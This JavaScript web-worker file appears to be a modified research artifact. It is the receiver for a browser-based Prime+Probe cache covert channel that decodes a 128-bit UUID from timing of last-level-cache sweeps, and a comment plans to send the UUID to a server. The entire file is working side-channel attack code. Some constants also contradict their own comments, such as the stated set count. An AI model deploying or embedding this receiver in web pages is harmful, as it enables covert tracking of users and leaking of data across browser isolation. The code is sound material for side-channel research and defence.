// Artifact repository for PP0 - for more information see
// https://github.com/yossioren/pp0

/*
nosajmik: constants for cache size - pp0 used an i5-3470 for evaluation,
which has a 6MB LLC with 12 ways. Hence 6 MB / 12 ways / 64 bytes per line
= 8192 cache sets. I've changed it to work on an i7-7600u that I have for
experiments, which has a 16-way 4MB LLC (hence 4096 sets).
*/
const CACHE_SETS = 12288; const CACHE_WAYS = 16;
const SET_SKIPPING_STEP = 2;

// To try out COUNT_SWEEPS mode (e.g. on the Tor Browser),
// increase SAMPLING_PERIOD_IN_MS to 100 and reduce MEASUREMENT_COUNT accordingly
// nosajmik: removed all non-sweep code, since we need it due to reduced timer
// precision (1ms) on Firefox (predicted to be more on Tor Browser).
const MEASUREMENT_COUNT = 10;
const SAMPLING_PERIOD_IN_MS = 100;

// Testing parameters - will change to something larger once
// we get the UUID part going. CHUNK_LEN must be greater than
// UUID_LEN + 2 * PREFIX.length
const CHUNK_LEN = 300;
const UUID_LEN = 128;

// Threshold - # sweeps above will be registered as zero bit, otherwise one
// Seems to work well on i7-9750H and i7-10710U
const SWEEPS_THRESHOLD = 121;

const BYTES_PER_MB = 1024 * 1024;
const BYTES_PER_LINE = 64;
// 4KB page / 64 bytes per cache line = 64 cache sets per page
const SETS_PER_PAGE = 64;

var PP;

// Prime and probe object
function PrimeProbe(sets, ways) {
    // Traversed to flush LLC
    // Browsers will (usually) page-align large (32MB) arrays when allocating them
    this.evictionArray = new Uint32Array(32 * BYTES_PER_MB / Uint32Array.BYTES_PER_ELEMENT);
    // Contains the starting indices for pointer chasing for each cache set in a page
    this.setHeads = new Array(SETS_PER_PAGE);

    this.probeSet = function (setOffset) {
        // nosajmik: performs pointer chasing to access LLC-sized buffer s.t.
        // loads are serially dependent; prevents reordering or combining
        // loads, or the prefetcher.
        var pointer = this.setHeads[setOffset];
        var listHead = pointer;
        do {
            pointer = this.evictionArray[pointer];
        } while (pointer != listHead);
        return pointer;
    }

    this.probeAllSets = function () {
        var p;
        // Every other set
        for (var set = 0; set < SETS_PER_PAGE; set += SET_SKIPPING_STEP) {
            p = this.probeSet(set);
        }
        return p;
    }

    this.shuffle = function (arrayToShuffle) {
        var tmp, current, top = arrayToShuffle.length;
        if (top) while (--top) {
            current = Math.floor(Math.random() * (top + 1));
            tmp = arrayToShuffle[current];
            arrayToShuffle[current] = arrayToShuffle[top];
            arrayToShuffle[top] = tmp;
        }
        return arrayToShuffle;
    }

    this.createSetHeads = function (sets, ways) {
        // 128 pages needed to cover all LLC sets
        var unshuffledArray = new Uint32Array(sets / SETS_PER_PAGE);
        // nosajmik: the + 4 comes from evictionArray being a Uint32Array (see below)
        var allSetOffset = Math.ceil(Math.log2(sets)) + 4; // 17 for sets=8192, 16 for sets=4096
        var i;
        for (i = 0; i < unshuffledArray.length; i++) {
            unshuffledArray[i] = i;
        }
        // Shuffle the array
        var shuffledArray = this.shuffle(unshuffledArray);

        // Now write into the eviction buffer
        var set_index, element_index, line_index;
        var currentElement, nextElement;
        for (set_index = 0; set_index < SETS_PER_PAGE; set_index++) {
            // nosajmik: the shifts of 10 and 4 are because evictionArray is
            // a Uint32Array - where each array element is 32 bits = 4 bytes long,
            // requiring log_2 4 = 2 bits for indexing. Hence the << 10 is effectively
            // << 12 for memory addresses, which is identical to * 4096 (page size),
            // and the << 4 is effectively << 6 for addresses, which is identical to
            // * 64 (cache line size).
            currentElement = (shuffledArray[0] << 10) + (set_index << 4);
            this.setHeads[set_index] = currentElement;
            // Outer loop iterates over cache ways, inner loop over the pages needed to cover all LLC sets
            for (line_index = 0; line_index < ways; line_index++) {
                for (element_index = 0; element_index < sets / SETS_PER_PAGE - 1; element_index++) {
                    nextElement = (line_index << allSetOffset) + (shuffledArray[element_index + 1] << 10) + (set_index << 4);
                    this.evictionArray[currentElement] = nextElement;
                    currentElement = nextElement;
                } // element

                if (line_index == ways - 1) {
                    // In the last line, the last pointer goes to the head of the entire set
                    nextElement = this.setHeads[set_index];
                } else {
                    // Last pointer goes back to the head of the next line
                    nextElement = ((line_index + 1) << allSetOffset) + (shuffledArray[0] << 10) + (set_index << 4);
                }

                this.evictionArray[currentElement] = nextElement;
                currentElement = nextElement;
            } // line
        } // set
    };

    this.createSetHeads(sets, ways);
} // PP object.


function createPPObject(sets, ways) {
    PP = new PrimeProbe(sets, ways);
}


function recv() {
    // nosajmik: receive uses the same 'current time modulo sampling period'
    // spin phase for (coarse) synchronization.
    let currentTime;
    let sweeps = 0;
    for (let i = 0; i < MEASUREMENT_COUNT; i++) {
        let nextMeasurementStartTime = currentTime + SAMPLING_PERIOD_IN_MS;
        do {
            currentTime = Date.now();
            sweeps++;
            PP.probeAllSets();
        } while (currentTime < nextMeasurementStartTime);
    }
    return sweeps;
}


onmessage = function(e) {
    createPPObject(CACHE_SETS, CACHE_WAYS);
    postMessage("Created listener Prime+Probe object");
    const PREFIX = e.data;

    function recvChunk() {
        let chunk = "";
        // while (true) {
        for (let i = 0; i < CHUNK_LEN; i++) {
            // Sender performs send -> wait till next second to send next bit
            // Receiver performs wait till next second -> recv -> wait again
            // This prevents the scheduler from causing insertions/deletions
            // in contrast to a scheme where both the sender and receiver probe.
            let currentTime;
            do {
                currentTime = Date.now();
            } while (currentTime % 1000 != 0);
            var sweeps = recv();
            // postMessage(sweeps);
            let bit = sweeps < SWEEPS_THRESHOLD ? "1" : "0";
            chunk += bit;
        }
    
        // Prefix, 32 zeros or ones, then prefix. Change soon to accommodate UUID
        let regex = new RegExp(PREFIX + `[0,1]{${UUID_LEN}}` + PREFIX);
        let index = chunk.search(regex);
        if (index >= 0) {
            let uuid = chunk.substring(index + PREFIX.length, index + PREFIX.length + UUID_LEN);
            // This would be an AJAX call to the server in the future
            postMessage(`UUID read: ${uuid}`);
        } else {
            // TODO: search for the prefix only to determine if the sender is active.
            // If there is no prefix, stay inactive for longer.
            postMessage(chunk);
            setTimeout(recvChunk, 5000);
        }
    }

    // Will read intermittently in chunks until success
    recvChunk();
}
